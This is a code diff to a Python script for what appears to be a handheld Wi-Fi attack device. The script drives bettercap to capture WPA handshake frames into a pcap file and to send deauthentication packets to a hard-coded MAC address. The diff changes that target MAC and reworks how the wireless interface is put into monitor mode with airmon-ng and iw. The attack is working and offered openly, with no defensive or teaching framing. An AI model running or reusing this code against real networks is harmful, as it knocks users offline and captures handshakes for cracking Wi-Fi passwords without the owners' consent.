@@ -23,7 +23,7 @@ commands = [
     'set net.sniff.filter ether proto 0x888e',
     'set net.sniff.output wpa.pcap',
     'net.sniff on',
-    'wifi.deauth bc:15:ac:76:5d:69'
+    'wifi.deauth 2c:98:11:93:eb:f3'
 ]
 
 #@functools.lru_cache(maxsize=236)
@@ -141,12 +141,17 @@ while True:
                                     #menu_options = ["Pwnagotchi", "Wifiphisher"]
                                     #selected_index = 0
                                     show_message("TEST")
-                                    os.system("sudo airmon-ng check kill")
-                                    os.system("sudo ifconfig wlan0 down && sudo iwconfig wlan0 mode monitor")
+                                    #os.system("sudo airmon-ng moncheck kill")
+                                    #time.sleep(1)
+                                    os.system("sudo iw wlan0 interface add mon0 type monitor")
+                                    os.system("sudo airmon-ng start mon0")
+                                    os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
+                                    
+                                    #os.system("sudo iwconfig wlan0 mode monitor")
 
                                     time.sleep(2)
                                     bettercap_process = subprocess.Popen(
-                                        ['sudo', 'bettercap', '-iface', 'wlan0'],
+                                        ['sudo', 'bettercap', '-iface', 'mon0'],
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
@@ -156,6 +161,7 @@ while True:
 
                                     time.sleep(0.5)
                                     for i in commands:
+                                        time.sleep(1.5)
                                         bettercap_process.stdin.write(i+'\n')
                                         bettercap_process.stdin.flush()
                                         show_message(bettercap_process.stdout.readline(),2)
